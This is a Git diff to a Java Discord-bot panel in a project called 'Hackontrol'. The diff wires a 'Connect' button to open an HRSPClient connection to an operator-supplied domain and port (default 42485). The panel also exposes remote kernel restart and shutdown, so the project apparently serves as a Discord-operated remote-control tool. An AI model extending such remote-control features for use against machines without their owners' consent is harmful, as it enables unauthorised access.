@@ -1,6 +1,7 @@
 package com.khopan.hackontrol.panel;
 
 import com.khopan.hackontrol.Hackontrol;
+import com.khopan.hackontrol.hrsp.HRSPClient;
 import com.khopan.hackontrol.library.Information;
 import com.khopan.hackontrol.library.Kernel;
 import com.khopan.hackontrol.registry.Registration;
@@ -13,7 +14,9 @@ import com.khopan.hackontrol.service.interaction.context.Question;
 import com.khopan.hackontrol.service.interaction.context.Question.QuestionType;
 import com.khopan.hackontrol.utils.HackontrolError;
 import com.khopan.hackontrol.utils.HackontrolMessage;
+import com.khopan.hackontrol.utils.TimeSafeReplyHandler;
 import com.khopan.hackontrol.utils.interaction.HackontrolButton;
+import com.khopan.hackontrol.utils.sendable.sender.ConsumerMessageCreateDataSendable;
 import com.khopan.hackontrol.utils.sendable.sender.MessageChannelSendable;
 
 import net.dv8tion.jda.api.JDA;
@@ -22,6 +25,7 @@ import net.dv8tion.jda.api.interactions.components.ActionRow;
 import net.dv8tion.jda.api.interactions.components.buttons.Button;
 import net.dv8tion.jda.api.interactions.components.text.TextInput;
 import net.dv8tion.jda.api.interactions.components.text.TextInputStyle;
+import net.dv8tion.jda.api.interactions.modals.ModalMapping;
 
 public class HackontrolPanel extends Panel {
 	public static final String PANEL_NAME = "hackontrol";
@@ -58,9 +62,15 @@ public class HackontrolPanel extends Panel {
 			HackontrolMessage.delete(context);
 			Kernel.initiateRestart(false);
 			this.shutdownProcedure();
-		}))).addActionRow(ButtonManager.dynamicButton(ButtonType.SUCCESS, "Connect", context -> context.replyModal(ModalManager.dynamicModal("Connect", modalContext -> {
-			modalContext.deferEdit().queue();
-		}).addActionRow(TextInput.create("domainName", "Domain Name", TextInputStyle.SHORT).setRequired(true).setPlaceholder("https://wwww.example.com/").build()).build()).queue()), HackontrolButton.delete()).queue(InteractionManager :: callback));
+		}))).addActionRow(ButtonManager.dynamicButton(ButtonType.SUCCESS, "Connect", context -> context.replyModal(ModalManager.dynamicModal("Connect", modalContext -> TimeSafeReplyHandler.start(modalContext, consumer -> {
+			try {
+				ModalMapping port = modalContext.getValue("port");
+				String portValue = port == null ? null : port.getAsString();
+				new HRSPClient(modalContext.getValue("domainName").getAsString(), portValue == null || portValue.isEmpty() ? 42485 : Integer.parseInt(portValue), consumer);
+			} catch(Throwable Errors) {
+				HackontrolError.throwable(ConsumerMessageCreateDataSendable.of(consumer), Errors);
+			}
+		})).addActionRow(TextInput.create("domainName", "Domain Name", TextInputStyle.SHORT).setRequired(true).setPlaceholder("https://www.example.com/").build()).addActionRow(TextInput.create("port", "Port", TextInputStyle.SHORT).setRequired(false).setPlaceholder("42485").build()).build()).queue()), HackontrolButton.delete()).queue(InteractionManager :: callback));
 
 		this.register(Registration.STRING_SELECT_MENU, HackontrolPanel.STRING_SELECT_STATUS, context -> {
 			this.channel.getJDA().getPresence().setStatus(DiscordStatus.fromName(context.getValues().get(0)).status);
